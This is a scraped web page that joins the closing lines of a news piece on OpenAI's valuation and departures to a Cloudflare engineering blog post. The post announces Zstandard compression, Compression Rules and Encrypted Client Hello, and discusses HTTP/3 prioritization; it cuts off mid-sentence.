<p>Marcus wrote: "GPT-5 hasn't dropped, Sora hasn't shipped, the company had an operating loss of $5 billion last year, there is no obvious moat, Meta is giving away similar software for free, many lawsuits pending.</p>
<p>"Yet people are valuing this company at $150 billion dollars.</p>
<p>"Absolutely insane. Investors shouldn't be pouring more money at higher valuations, they should be asking what is going on."</p>
<p>When we asked OpenAI for comment, it had nothing to add about the departures specifically, with a spokesperson saying: "We remain focused on building AI that benefits everyone and as we've previously shared we're working with our board to ensure that we're best positioned to succeed in our mission. The nonprofit is core to our mission and will continue to exist."</p>
<p>It didn't mention whether the non-profit would actually have control, however. ®</p>

<div id="readability-page-1" class="page"><div id="post"><article><p>2024-09-25</p><section><p>23 min read</p><img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2pa5KXMxaWp3ss7jnNGRvU/7ebb56c028bc17a9da5f2033553c79d6/image12.png" alt=""><div><p>As the Internet grows, so do the demands for speed and security. At Cloudflare, we’ve spent the last 14 years simplifying the adoption of the latest web technologies, ensuring that our users stay ahead without the complexity. From being the first to offer free SSL certificates through <a href="https://blog.cloudflare.com/introducing-universal-ssl/"><u>Universal SSL</u></a> to quickly supporting innovations like <a href="https://blog.cloudflare.com/introducing-tls-1-3"><u>TLS 1.3</u></a>, <a href="https://blog.cloudflare.com/introducing-cloudflares-automatic-ipv6-gatewa/"><u>IPv6</u></a>, and <a href="https://blog.cloudflare.com/http-3-from-root-to-tip/"><u>HTTP/3</u></a>, we've consistently made it easy for everyone to harness cutting-edge advancements.</p><p>One of the most exciting recent developments in web performance is Zstandard (zstd) — a new compression algorithm that we have found compresses data 42% faster than Brotli while maintaining almost the same compression levels. Not only that, but Zstandard reduces file sizes by 11.3% compared to GZIP, all while maintaining comparable speeds. As compression speed and efficiency directly impact latency, this is a game changer for improving user experiences across the web.</p><p>We’re also re-starting the <a href="https://blog.cloudflare.com/announcing-encrypted-client-hello/"><u>rollout of Encrypted Client Hello (ECH)</u></a>, a <a href="https://datatracker.ietf.org/doc/draft-ietf-tls-esni/"><u>new proposed standard </u></a>that prevents networks from snooping on which websites a user is visiting. <a href="https://blog.cloudflare.com/encrypted-client-hello/"><u>Encrypted Client Hello (ECH) is a successor to ESNI</u></a> and masks the <a href="https://www.cloudflare.com/en-gb/learning/ssl/what-is-sni/"><u>Server Name Indication (SNI)</u></a> that is used to negotiate a TLS handshake. This means that whenever a user visits a website on Cloudflare that has ECH enabled, no one except for the user, Cloudflare, and the website owner will be able to determine which website was visited. Cloudflare is a big proponent of privacy for everyone and is excited about the prospects of bringing this technology to life.</p><p>In this post, we also further explore our work measuring the impact of HTTP/3 prioritization, and the development of Bottleneck Bandwidth and Round-trip propagation time (BBR) congestion control to further optimize network performance.</p><h2>Introducing Zstandard compression</h2><p><a href="https://github.com/facebook/zstd"><u>Zstandard</u></a>, an advanced compression algorithm, was developed by <a href="https://engineering.fb.com/2018/12/19/core-infra/zstandard/"><u>Yann Collet at Facebook</u></a> and open sourced in August 2016 to manage large-scale data processing.&nbsp; It has gained popularity in recent years due to its impressive compression ratios and speed. The protocol was included in <a href="https://chromestatus.com/feature/6186023867908096"><u>Chromium-based browsers</u></a> and <a href="https://connect.mozilla.org/t5/ideas/add-support-for-zstd-compression/idi-p/52155"><u>Firefox</u></a> in March 2024 as a <a href="https://caniuse.com/zstd"><u>supported</u></a> compression algorithm.&nbsp;</p><p>Today, we are excited to announce that Zstandard compression between Cloudflare and browsers is now available to everyone.&nbsp;</p><p>Our testing shows that Zstandard compresses data up to 42% faster than <a href="https://github.com/google/brotli"><u>Brotli</u></a> while achieving nearly equivalent data compression. Additionally, Zstandard outperforms <a href="https://datatracker.ietf.org/doc/html/rfc1952"><u>GZIP</u></a> by approximately 11.3% in compression efficiency, all while maintaining similar compression speeds. This means Zstandard can compress files to the same size as Brotli but in nearly half the time, speeding up your website without sacrificing performance.

This is exciting because compression speed and file size directly impacts latency. When a browser requests a resource from the origin server, the server needs time to compress the data before it’s sent over the network. A faster compression algorithm, like Zstandard, reduces this initial processing time. By also reducing the size of files transmitted over the Internet, better compression means downloads take less time to complete, websites load quicker, and users ultimately get a better experience.</p>

            </figure><h3>Why is compression so important?</h3><p>Website performance is crucial to the success of online businesses. <a href="https://www2.deloitte.com/content/dam/Deloitte/ie/Documents/Consulting/Milliseconds_Make_Millions_report.pdf"><u>Study</u></a> after <a href="https://www.thinkwithgoogle.com/_qs/documents/4290/c676a_Google_MobileSiteSpeed_Playbook_v2.1_digital_4JWkGQT.pdf"><u>study</u></a> has shown that an increased load time <a href="https://www.cloudflare.com/learning/performance/more/website-performance-conversion-rates/"><u>directly affects sales</u></a>. In highly competitive markets, the performance of a website is crucial for success. Just like a physical shop situated in a remote area faces challenges in attracting customers, a slow website encounters similar difficulties in attracting traffic. 

Think about buying a piece of flat pack furniture such as a bookshelf. Instead of receiving the bookshelf fully assembled, which would be expensive and cumbersome to transport, you receive it in a compact, flat box with all the components neatly organized, ready for assembly. The parts are carefully arranged to take up the least amount of space, making the package much smaller and easier to handle. When you get the item, you simply follow the instructions to assemble it to its proper state.&nbsp;</p><p>This is similar to how data compression works. The data is “disassembled” and packed tightly to reduce its size before being transmitted. Once it reaches its destination, it’s “reassembled” to its original form. This compression process reduces the amount of data that needs to be sent, saving bandwidth, reducing costs, and speeding up the transfer, just like how flat pack furniture reduces shipping costs and simplifies delivery logistics.</p><p>However, with compression, there is a tradeoff: time to compress versus the overall compression ratio. A compression ratio is a measure of how much a file's size is reduced during compression. For example, a 10:1 compression ratio means that the compressed file is one-tenth the size of the original. Just like assembling flat-pack furniture takes time and effort, achieving higher compression ratios often requires more processing time. While a higher compression ratio significantly reduces file size — making data transmission faster and more efficient — it may take longer to compress and decompress the data. Conversely, quicker compression methods might produce larger files, leading to faster processing but at the cost of greater bandwidth usage. Balancing these factors is key to optimizing performance in data transmission.</p><p><a href="https://w3techs.com/technologies/details/ce-compression"><u>W3 Technologies</u></a> reports that as of September 12, 2024, 88.6% of websites rely on compression to optimize speed and reduce bandwidth usage. <a href="https://datatracker.ietf.org/doc/html/rfc1952"><u>GZIP</u></a>, introduced in 1996, remains the default algorithm for many, used by 57.0% of sites due to its reasonable compression ratios and fast compression speeds. <a href="https://datatracker.ietf.org/doc/html/rfc7932"><u>Brotli</u></a>, released by Google in 2016, delivers better <a href="https://blog.cloudflare.com/results-experimenting-brotli/"><u>compression ratios</u></a>, leading to smaller file sizes, especially for static assets like JavaScript and CSS, and is used by 45.5% of websites. However, this also means that 11.4% of websites still operate without any compression, missing out on crucial performance improvements.</p><p>As the Internet and its supporting infrastructure have evolved, so have user demands for faster, more efficient performance. This growing need for higher efficiency without compromising speed is where Zstandard comes into play.</p><h3>Enter Zstandard</h3><p>Zstandard offers higher compression ratios comparable to GZIP, but with significantly faster compression and decompression speeds than Brotli. This makes it ideal for real-time applications that require both speed and relatively high compression ratios.</p><p>To understand Zstandard's advantages, it's helpful to know about <a href="https://blog.cloudflare.com/cloudflare-fights-cancer/"><u>Zlib</u></a>. Zlib was developed in the mid-1990s based on the <a href="https://en.wikipedia.org/wiki/DEFLATE"><u>DEFLATE</u></a> compression algorithm, which combines <a href="https://www.cloudflare.com/en-gb/learning/performance/glossary/what-is-image-compression/"><u>LZ77 and Huffman coding</u></a> to reduce file sizes. While Zlib has been a compression standard since the mid-1990s and is used in Cloudflare’s <a href="https://blog.cloudflare.com/cloudflare-fights-cancer/"><u>open-source</u></a> GZIP implementation, its design is limited by a 32 KB sliding window — a constraint from the memory limitations of that era. This makes Zlib less efficient on modern hardware, which can access far more memory.</p><p>Zstandard enhances Zlib by leveraging modern innovations and hardware capabilities. Unlike Zlib’s fixed 32 KB window, Zstandard has no strict memory constraints and can theoretically address terabytes of memory. However,&nbsp; in practice, it typically uses much less, around 1 MB at lower compression levels. This flexibility allows Zstandard to buffer large amounts of data, enabling it to identify and compress repeating patterns more effectively. Zstandard also employs <a href="https://engineering.fb.com/2016/08/31/core-infra/smaller-and-faster-data-compression-with-zstandard/#:~:text=Repcode%20modeling,within%20zlib/gzip."><u>repcode modeling</u></a> to efficiently compress structured data with repetitive sequences, further reducing file sizes and enhancing its suitability for modern compression needs.</p><p>Zstandard is optimized for modern CPUs, which can execute multiple tasks simultaneously using multiple Arithmetic Logic Units (ALUs) that are used to perform mathematical tasks. Zstandard achieves this by processing data in parallel streams, dividing it into multiple parts that are processed concurrently. <a href="https://chromium.googlesource.com/external/github.com/klauspost/compress/+/refs/heads/master/huff0/"><u>The Huffman decoder, Huff0</u></a>, can decode multiple symbols in parallel on a single CPU core, and when combined with multi-threading, this leads to substantial speed improvements during both compression and decompression.</p><p>Zstandard’s branchless design is a crucial innovation that enhances CPU efficiency, especially in modern processors. To understand its significance, consider how CPUs execute instructions.</p><p>Modern CPUs use pipelining, where different stages of an instruction are processed simultaneously—like a production line—keeping all parts of the processor busy. However, when CPUs encounter a branch, such as an 'if-else' decision, they must make a <a href="https://blog.cloudflare.com/branch-predictor/"><u>branch prediction</u></a> to guess the next step. If the prediction is wrong, the pipeline must be cleared and restarted, causing slowdowns.</p><p>Zstandard avoids this issue by eliminating conditional branching. Without relying on branch predictions, it ensures the CPU can execute instructions continuously, keeping the pipeline full and avoiding performance bottlenecks.</p><p>A key feature of Zstandard is its use of <a href="https://www.rfc-editor.org/rfc/rfc8478.html#section-4.1"><u>Finite State Entropy (FSE)</u></a>, an advanced compression method that encodes data more efficiently based on probability. FSE, built on the <a href="https://en.wikipedia.org/wiki/Asymmetric_numeral_systems"><u>Asymmetric Numeral System (ANS)</u></a>, allows Zstandard to use fractional bits for encoding, unlike traditional Huffman coding, which only uses whole bits. This allows heavily repeated data to be compressed more tightly without sacrificing efficiency.</p><h3>Zstandard findings</h3><p>In the third quarter of 2024, we conducted extensive tests on our new Zstandard compression module, focusing on a 24-hour period where we switched the default compression algorithm from Brotli to Zstandard across our Free plan traffic. This experiment spanned billions of requests, covering a wide range of file types and sizes, including HTML, CSS, and JavaScript. The results were very promising, with significant improvements in both compression speed and file size reduction, leading to faster load times and more efficient bandwidth usage.</p><h4>Compression ratios</h4><p>In terms of compression efficiency, Zstandard delivers impressive results. Below are the average compression ratios we observed during our testing.</p><table><tbody><tr><td><p><b>Compression Algorithm</b></p></td><td><p><b>Average Compression Ratio</b></p></td></tr><tr><td><p>GZIP</p></td><td><p>2.56</p></td></tr><tr><td><p>Zstandard</p></td><td><p>2.86</p></td></tr><tr><td><p>Brotli</p></td><td><p>3.08</p></td></tr></tbody></table>

            </figure><p>As the table shows, Zstandard achieves an average compression ratio of <b>2.86:1</b>, which is notably higher than gzip's <b>2.56:1</b> and close to Brotli’s <b>3.08:1</b>. While Brotli slightly edges out Zstandard in terms of pure compression ratio, what is particularly exciting is that we are only using Zstandard’s default compression level of 3 (out of 22) on our traffic. In the fourth quarter of 2024, we plan to experiment with higher compression levels and multithreading capabilities to further enhance Zstandard’s performance and optimize results even more.</p><h4>Compression speeds</h4><p>What truly sets Zstandard apart is its speed. Below are the average times to compress data from our traffic-based tests measured in milliseconds:</p><table><tbody><tr><td><p><b>Compression Algorithm</b></p></td><td><p><b>Average Time to Compress (ms)</b></p></td></tr><tr><td><p>GZIP</p></td><td><p>0.872</p></td></tr><tr><td><p>Zstandard</p></td><td><p>0.848</p></td></tr><tr><td><p>Brotli</p></td><td><p>1.544</p></td></tr></tbody></table>
            <figure>
            
            <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/15AxPyO1PmyV6hDRRjBznu/8741362637f3df4db34eb4e40fdc0c12/image10.png" alt="" width="1999" height="1234" loading="lazy">
            
            </figure><p>Zstandard not only compresses data efficiently, but it also does so <b>42% faster</b> than Brotli, with an average compression time of <b>0.848 ms</b> compared to Brotli’s <b>1.544 ms</b>. It even outperforms gzip, which compresses at <b>0.872 ms</b> on average.</p><p>From our results, we have found Zstandard strikes an excellent balance between achieving a high compression ratio and maintaining fast compression speed, making it particularly well-suited for dynamic content such as HTML and non-cacheable sensitive data. Zstandard can compress these responses from the origin quickly and efficiently, saving time compared to Brotli while providing better compression ratios than GZIP.</p><h3>Implementing Zstandard at Cloudflare</h3><p>To implement Zstandard compression at Cloudflare, we needed to build it into our Nginx-based service which already handles GZIP and Brotli compression. Nginx is modular by design, with each module performing a specific function, such as compressing a response. Our custom Nginx module leverages Nginx's function 'hooks' — specifically, the header filter and body filter — to implement Zstandard compression.</p><h4>Header filter</h4><p>The header filter allows us to access and modify response headers. For example, Cloudflare only compresses responses above a certain size (50 bytes for Zstandard), which is enforced with this code:</p>
            <pre><code>if (r-&gt;headers_out.content_length_n != -1 &amp;&amp;
    r-&gt;headers_out.content_length_n &lt; conf-&gt;min_length) {
    return ngx_http_next_header_filter(r);
}</code></pre>
            <p>Here, we check the "Content-Length" header. If the content length is less than our minimum threshold, we skip compression and let Nginx execute the next module.</p><p>We also need to ensure the content is not already compressed by checking the "Content-Encoding" header:</p>
            <pre><code>if (r-&gt;headers_out.content_encoding &amp;&amp;
    r-&gt;headers_out.content_encoding-&gt;value.len) {
    return ngx_http_next_header_filter(r);
}</code></pre>
            <p>If the content is already compressed, the module is bypassed, and Nginx proceeds to the next header filter.</p><h4>Body filter</h4><p>The body filter hook is where the actual processing of the response body occurs. In our case, this involves compressing the data with the Zstandard encoder and streaming the compressed data back to the client. Since responses can be very large, it's not feasible to buffer the entire response in memory, so we manage internal memory buffers carefully to avoid running out of memory.</p><p>The Zstandard library is well-suited for streaming compression and provides the <code>ZSTD_compressStream2</code> function:</p>
            <pre><code>ZSTDLIB_API size_t ZSTD_compressStream2(ZSTD_CCtx* cctx,
                                        ZSTD_outBuffer* output,
                                        ZSTD_inBuffer* input,
                                        ZSTD_EndDirective endOp);</code></pre>
            <p>This function can be called repeatedly with chunks of input data to be compressed. It accepts input and output buffers and an "operation" parameter (<code>ZSTD_EndDirective endOp</code>) that controls whether to continue feeding data, flush the data, or finalize the compression process.</p><p>Nginx uses a "flush" flag on memory buffers to indicate when data can be sent. Our module uses this flag to set the appropriate Zstandard operation:</p>
            <pre><code>switch (zstd_operation) {
    case ZSTD_e_continue: {
        if (flush) {
            zstd_operation = ZSTD_e_flush;
        }
    }
}
</code></pre>
            <p>This logic allows us to switch from the "ZSTD_e_continue" operation, which feeds more input data into the encoder, to "ZSTD_e_flush", which extracts compressed data from the encoder.</p><h4>Compression cycle</h4><p>The compression module operates in the following cycle:</p><ol><li><p>Receive uncompressed data.</p></li><li><p>Locate an internal buffer to store compressed data.</p></li><li><p>Compress the data with Zstandard.</p></li><li><p>Send the compressed data back to the client.</p></li></ol><p>Once a buffer is filled with compressed data, it’s passed to the next Nginx module and eventually sent to the client. When the buffer is no longer in use, it can be recycled, avoiding unnecessary memory allocation. This process is managed as follows:</p>
            <pre><code>if (free) {
    // A free buffer is available, so use it
    buffer = free;
} else if (buffers_used &lt; maximum_buffers) {
    // No free buffers, but we're under the limit, so allocate a new one
    buffer = create_buf();
} else {
    // No free buffers and can't allocate more
    err = no_memory;
}
</code></pre>
            <h4>Handling backpressure</h4><p>If no buffers are available, it can lead to backpressure — a situation where the Zstandard module generates compressed data faster than the client can receive it. This causes data to become "stuck" inside Nginx, halting further compression due to memory constraints. In such cases, we stop compression and send an empty buffer to the next Nginx module, allowing Nginx to attempt to send the data to the client again. When successful, this frees up memory buffers that our module can reuse, enabling continued streaming of the compressed response without buffering the entire response in memory.</p><h3>What's next? Compression dictionaries</h3><p>The future of Internet compression lies in the use of <a href="https://datatracker.ietf.org/doc/draft-ietf-httpbis-compression-dictionary/"><u>compression dictionaries</u></a>. Both Brotli and Zstandard support dictionaries, offering up to <a href="https://developer.chrome.com/blog/shared-dictionary-compression"><u>90% improvement</u></a> on compression levels compared to using static dictionaries.&nbsp;</p><p>Compression dictionaries store common patterns or sequences of data, allowing algorithms to compress information more efficiently by referencing these patterns rather than repeating them. This concept is akin to how an iPhone's predictive text feature works. For example, if you frequently use the phrase "On My Way," you can customize your iPhone’s dictionary to recognize the abbreviation "OMW" and automatically expand it to "On My Way" when you type it, saving the user from typing six extra letters.</p><table><tbody><tr><td><p>O</p></td><td><p>M</p></td><td><p>W</p></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><p>O</p></td><td><p>n</p></td><td></td><td><p>M</p></td><td><p>y</p></td><td></td><td><p>W</p></td><td><p>a</p></td><td><p>y</p></td></tr></tbody></table><p>Traditionally, compression algorithms use a static dictionary defined by its RFC that is shared between clients and origin servers. This static dictionary is designed to be broadly applicable, balancing size and compression effectiveness for general use. However, Zstandard and Brotli support custom dictionaries, tailored specifically to the content being sent to the client. For example, Cloudflare could create a specialized dictionary that focuses on frequently used terms like “Cloudflare”. This custom dictionary would compress these terms more efficiently, and a browser using the same dictionary could decode them accurately, leading to significant improvements in compression and performance.</p><p>In the future, we will enable users to leverage origin-generated dictionaries for Zstandard and Brotli to enhance compression. Another exciting area we're exploring is the use of AI to create these dictionaries dynamically without them needing to be generated at the origin. By analyzing data streams in real-time, Cloudflare could develop context-aware dictionaries tailored to the specific characteristics of the data being processed. This approach would allow users to significantly improve both compression ratios and processing speed for their applications.</p><h3>Compression Rules for everyone</h3><p>Today we’re also excited to announce the introduction of <a href="https://developers.cloudflare.com/rules/compression-rules/"><u>Compression Rules</u></a> for all our customers. By default, Cloudflare will automatically compress certain content types based on their <a href="https://developers.cloudflare.com/speed/optimization/content/brotli/content-compression"><u>Content-Type headers</u></a>. Customers can use compression rules to optimize how and what Cloudflare compresses. This feature was previously exclusive to our Enterprise plans.

Compression Rules is built on the same robust framework as our other rules products, such as Origin Rules, Custom Firewall Rules, and Cache Rules, with additional fields for Media Type and Extension Type. This allows you to easily specify the content you wish to compress, providing granular control over your site’s performance optimization.</p><p>Compression rules are now available on all our pay-as-you-go plans and will be added to free plans in October 2024. This feature was previously exclusive to our Enterprise customers. In the table below, you’ll find the updated limits, including an increase to 125 Compression Rules for Enterprise plans, aligning with our other rule products' quotas.</p><table><tbody><tr><td><p><b>Plan Type</b></p></td><td><p><b>Free*</b></p></td><td><p><b>Pro</b></p></td><td><p><b>Business</b></p></td><td><p><b>Enterprise</b></p></td></tr><tr><td><p>Available Compression Rules</p></td><td><p>10</p></td><td><p>25</p></td><td><p>50</p></td><td><p>125</p></td></tr></tbody></table><h3>Using Compression Rules to enable Zstandard</h3><p>To integrate our Zstandard module into our platform, we also added support for it within our Compression Rules framework. This means that customers can now specify Zstandard as their preferred compression method, and our systems will automatically enable the Zstandard module in Nginx, disabling other compression modules when necessary.</p><p>The <code>Accept-Encoding</code> header determines which compression algorithms a client supports. If a browser supports Zstandard (<code>zstd</code>), and both Cloudflare and the zone have enabled the feature, then Cloudflare will return a Zstandard compressed response.</p>

            </figure><p>If the client does not support Zstandard, then Cloudflare will automatically fall back to Brotli, GZIP, or serve the content uncompressed where no compression algorithm is supported, ensuring compatibility. 

To enable Zstandard for your entire site or specifically filter on certain file types, all Cloudflare users can&nbsp;deploy a simple compression rule.</p>

We plan to implement full end-to-end support for Zstandard in 2025, offering customers another effective way to reduce their egress costs.</p><p>Once Zstandard is enabled, you can view your browser’s <a href="https://developer.chrome.com/docs/devtools/network"><u>Network Activity</u></a> log to check the content-encoding headers of the response.</p>

          <figure>
          <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/4BFVDlJK6Mxn0P1yk5UdHK/88fd93601aa93208ada4ff93ece63049/image9.png" alt="" width="1999" height="600" loading="lazy">
          </figure><p>While performance is crucial for delivering a fast user experience, ensuring privacy is equally important in today’s Internet landscape. As we optimize for speed with Zstandard, Cloudflare is also working to protect users' sensitive information from being exposed during data transmission. With web traffic growing more complex and interconnected, it's critical to keep both performance and privacy in balance. This is where technologies like Encrypted Client Hello (ECH) come into play, securing connections without sacrificing speed.</p><p>Ten years ago, we embarked on a mission to create a more secure and encrypted web. At the time, much of the Internet remained unencrypted, leaving user data vulnerable to interception. On September 27, 2014, we took a major step forward by enabling HTTPS for free for all Cloudflare customers. Overnight, we doubled the size of the encrypted web. This set the stage for a more secure Internet, ensuring that encryption was not a privilege limited by budget but a right accessible to everyone.</p><p>Since then, both Cloudflare and the broader community have helped encrypt more of the Internet. Projects like <a href="https://letsencrypt.org/"><u>Let's Encrypt</u></a> launched to make certificates free for everyone. Cloudflare invested to encrypt more of the connection, and future-proof that encryption from coming technologies like <a href="https://blog.cloudflare.com/post-quantum-for-all/"><u>quantum computers</u></a>. We've always believed that it was everyone's right, regardless of your budget, to have an encrypted Internet at no cost.</p><p>One of the last major challenges has been securing the SNI (Server Name Identifier), which remains exposed in plaintext during the TLS handshake. This is where Encrypted Client Hello (ECH) comes in, and today, we are proud to announce that we're closing that gap.&nbsp;</p><p>Cloudflare announced support for <a href="https://blog.cloudflare.com/announcing-encrypted-client-hello/"><u>Encrypted Client Hello (ECH)</u></a> in 2023 and has continued to enhance its implementation in collaboration with our Internet browser partners. During a TLS handshake, one of the key pieces of information exchanged is the <a href="https://www.cloudflare.com/learning/ssl/what-is-sni/"><u>Server Name Indication (SNI)</u></a>, which is used to initiate a secure connection. Unfortunately, the SNI is sent in plaintext, meaning anyone can read it. Imagine hand-delivering a letter — anyone following you can see where you're delivering it, even if they don’t know the contents. With ECH, it is like sending the same confidential letter to a P.O. Box. You place your sensitive letter in a sealed inner envelope with the actual address. Then, you put that envelope into a larger, standard envelope addressed to a public P.O. Box, trusted to securely forward your intended recipient. The larger envelope containing the non-sensitive information is visible to everyone, while the inner envelope holds the confidential details, such as the actual address and recipient. Just as the P.O. Box maintains the anonymity of the true recipient’s address, ECH ensures that the SNI remains protected.&nbsp;</p><p>While encrypting the SNI is a primary motivation for ECH, its benefits extend further. ECH encrypts the entire Client Hello, ensuring user privacy and enabling TLS to evolve without exposing sensitive connection data. By securing the full handshake, ECH allows for flexible, future-proof encryption designs that safeguard privacy as the Internet continues to grow.</p><h3>How ECH works</h3><p>Encrypted Client Hello (ECH) introduces a layer of privacy by dividing the ClientHello message into two distinct parts: a ClientHelloOuter and a ClientHelloInner.&nbsp;</p><ul><li><p><b>ClientHelloOuter</b>: This part remains unencrypted and contains innocuous values for sensitive TLS extensions. It sets the SNI to Cloudflare’s public name, currently set to cloudflare-ech.com. Cloudflare manages this domain and possesses the necessary certificates to handle TLS negotiations for it.</p></li><li><p><b>ClientHelloInner</b>: This part is encrypted with a public key and includes the actual server name the client wants to visit, along with other sensitive TLS extensions. The encryption scheme ensures that this sensitive data can only be decrypted by the client-facing server, which in our case is Cloudflare.</p></li></ul><p>During the TLS handshake, the ClientHelloOuter reveals only the public name (e.g., cloudflare-ech.com), while the encrypted ClientHelloInner carries the real server name. As a result, intermediaries observing the traffic will only see cloudflare-ech.com in plaintext, concealing the actual destination.</p>
          <figure>
          <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/5C7EUMmlYp3gmvfvnbeKul/56ba77eafb4a3f9593510c50242aeb44/image13.png" alt="" width="1574" height="1437" loading="lazy">
          </figure><p>The design of ECH effectively addresses many challenges in securely deploying handshake encryption, thanks to the collaborative efforts within the <a href="https://datatracker.ietf.org/doc/draft-ietf-tls-esni/"><u>IETF community</u></a>. The key to ECH’s success is its integration with other IETF standards, including the new <a href="https://datatracker.ietf.org/doc/html/rfc9460"><u>HTTPS DNS resource record</u></a>, which enables HTTPS endpoints to advertise different TLS capabilities and simplifies key distribution. By using <a href="https://blog.cloudflare.com/dns-encryption-explained/"><u>Encrypted DNS</u></a> methods, browsers and clients can anonymously query these HTTPS records. These records contain the ECH parameters needed to initiate a secure connection.&nbsp;</p><p>ECH leverages the <a href="https://blog.cloudflare.com/hybrid-public-key-encryption/"><u>Hybrid Public Key Encryption (HPKE)</u></a> standard, which streamlines the handshake encryption process, making it more secure and easier to implement. Before initiating a layer 4 connection, the user’s browser makes a DNS request for an HTTPS record, and zones with ECH enabled will include an ECH configuration in the HTTPS record containing an encryption public key and some associated metadata. For example, looking at the zone cloudflare-ech.com, you can see the following record returned:</p>
            <pre><code>dig cloudflare-ech.com https +short


1 . alpn="h3,h2" ipv4hint=104.18.10.118,104.18.11.118 ech=AEX+DQBB2gAgACD1W1B+GxY3nZ53Rigpsp0xlL6+80qcvZtgwjsIs4YoOwAEAAEAAQASY2xvdWRmbGFyZS1lY2guY29tAAA= ipv6hint=2606:4700::6812:a76,2606:4700::6812:b76</code></pre>
            <p>Aside from the public key used by the client to encrypt ClientHelloInner and other <a href="https://www.ietf.org/archive/id/draft-ietf-tls-esni-20.html#name-encrypted-clienthello-confi"><u>parameters</u></a> that specify the ECH configuration, the configured public name is also present.</p>
            <pre><code>Y2xvdWRmbGFyZS1lY2guY29t</code></pre>
            <p>When the string is decoded it reveals:</p>
            <pre><code>cloudflare-ech.com</code></pre>
            <p>This public name is then used by the client in the ClientHelloOuter.</p><h3>Practical implications</h3><p>With ECH, any observer monitoring the traffic between the client and Cloudflare will see only uniform TLS handshakes that appear to be directed towards <code>cloudflare-ech.com</code>, regardless of the actual website being accessed. For instance, if a user visits <code>example.com</code>, intermediaries will not discern this specific destination but will only see <code>cloudflare-ech.com</code> in the visible handshake data.&nbsp;</p><h3>The problem with middleboxes</h3><p>In a basic HTTPS connection, a browser (client) establishes a TLS connection directly with an origin server to send requests and download content. However, many connections on the Internet do not go directly from a browser to the server but instead pass through some form of proxy or middlebox (often referred to as a "monster-in-the-middle" or MITM). This routing through intermediaries can occur for various reasons, both benign and malicious.</p><p>One common type of HTTPS interceptor is the TLS-terminating forward proxy. This proxy sits between the client and the destination server, transparently forwarding and potentially modifying traffic. To perform this task, the proxy terminates the TLS connection from the client, decrypts the traffic, and then re-encrypts and forwards it to the destination server over a new TLS connection. To avoid browser certificate validation errors, these forward proxies typically require users to install a root certificate on their devices. This root certificate allows the proxy to generate and present a trusted certificate for the destination server, a process often managed by network administrators in corporate environments, as seen with <a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-devices/warp/"><u>Cloudflare WARP</u></a>. These services can help prevent sensitive company data from being transmitted to unauthorized destinations, safeguarding confidentiality.</p>
          <figure>
          <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2xfA7PB61KxnbZ96XRLahh/4392b3cb65ee791a334cd182fafd8287/image8.png" alt="" width="1999" height="1058" loading="lazy">
          </figure><p>However, TLS-terminating forward proxies may not be equipped to handle Encrypted Client Hello (ECH) correctly, especially if the MITM proxy and the client facing ECH server belong to different entities.&nbsp; Because the MITM proxy will terminate the TLS connection without being ECH aware, it may provide a valid certificate for the public name (in our case, cloudflare-ech.com) without being able to decrypt the ClientHelloInner or provide a new public key for the client to use. In this case, the client considers ECH to be disabled, which means you lose out on both ECH and pay the cost of an extra round trip.&nbsp;</p><p>We also observed that specific Cloudflare setups, such as <a href="https://developers.cloudflare.com/dns/cname-flattening/"><u>CNAME Flattening</u></a> and <a href="https://developers.cloudflare.com/cloudflare-for-platforms/cloudflare-for-saas/saas-customers/how-it-works/"><u>Orange-to-Orange configurations</u></a>, could cause ECH to break. This issue arose because the end destination for these connections did not support TLS 1.3, preventing ECH from being processed correctly. Fortunately, in close collaboration with our browser partners, we implemented a fallback in our <a href="https://boringssl.googlesource.com/boringssl/+/d274b1bacdca36f3941bf78e43dc38acf676a1a8"><u>BoringSSL</u></a> implementation that handles TLS terminations. This fallback allows browsers to retry connections over TLS 1.2 without ECH, ensuring that a connection can be established and not break.</p><p>As a result of these improvements, we have enabled ECH by default for all Free plans, while all other plan types can manually enable it through their <a href="https://dash.cloudflare.com/?to=/:account/:zone/ssl-tls/edge-certificates#ech-card"><u>Cloudflare dashboard</u></a> or via the API. We are excited to support ECH at scale, enhancing the privacy and security of users' browsing activities. ECH plays a crucial role in safeguarding online interactions from potential eavesdroppers and maintaining the confidentiality of web activities.</p><h2>HTTP/3 Prioritization and QUIC congestion control</h2><p>Two other areas we are investing in to improve performance for all our customers are <a href="https://blog.cloudflare.com/better-http-3-prioritization-for-a-faster-web/"><u>HTTP/3 Prioritization</u></a> and QUIC congestion control.&nbsp;</p><p>HTTP/3 Prioritization focuses on efficiently managing the order in which web assets are loaded, thereby improving web performance by ensuring critical assets are delivered faster. HTTP/3 Prioritization uses Extensible Priorities to simplify prioritization with two parameters: urgency (ranging from 0-7) and a true/false value indicating whether the resource can be processed progressively. This allows resources like HTML, CSS, and images to be prioritized based on importance.</p><p>On the other hand, QUIC congestion control aims to optimize the flow of data, preventing network bottlenecks and ensuring smooth, reliable transmission even under heavy traffic conditions.&nbsp;</p><p>Both of these improvements significantly impact how Cloudflare’s network serves requests to clients. Before deploying these technologies across our global network, which handles peak traffic volumes of over 80 million requests per second, we first developed a reliable method to measure their impact through rigorous experimentation.</p><h3>Measuring impact</h3><p>Accurately measuring the impact of features implemented by Cloudflare for our customers is crucial for several reasons. These measurements ensure that optimizations related to performance, security, or reliability deliver the intended benefits without introducing new issues. Precise measurement validates the effectiveness of these changes, allowing Cloudflare to assess improvements in metrics such as load times, user experience, and overall site security. One of the best ways to measure performance changes is through aggregated real-world data.</p><p><a href="https://developers.cloudflare.com/pages/how-to/web-analytics/"><u>Cloudflare Web Analytics</u></a> offers free, privacy-first analytics for your website, helping you understand the performance of your web pages as experienced by your visitors. Real User Metrics (RUM) is a vital tool in web performance optimization, capturing data from real users interacting with a website, providing insights into site performance under real-world conditions. RUM tracks various metrics directly from the user's device, including load times, resource usage, and user interactions. This data is essential for understanding the actual user experience, as it reflects the diverse environments and conditions under which the site is accessed.</p><p>A key performance indicator measured through RUM is <a href="https://web.dev/articles/vitals#core-web-vitals"><u>Core Web Vitals (CWV)</u></a>, a set of metrics defined by Google that quantify crucial aspects of user experience on the web. CWV focuses on three main areas: loading performance, interactivity, and visual stability. The specific metrics include Largest Contentful Paint (LCP), which measures loading performance; First Input Delay (FID), which gauges interactivity; and Cumulative Layout 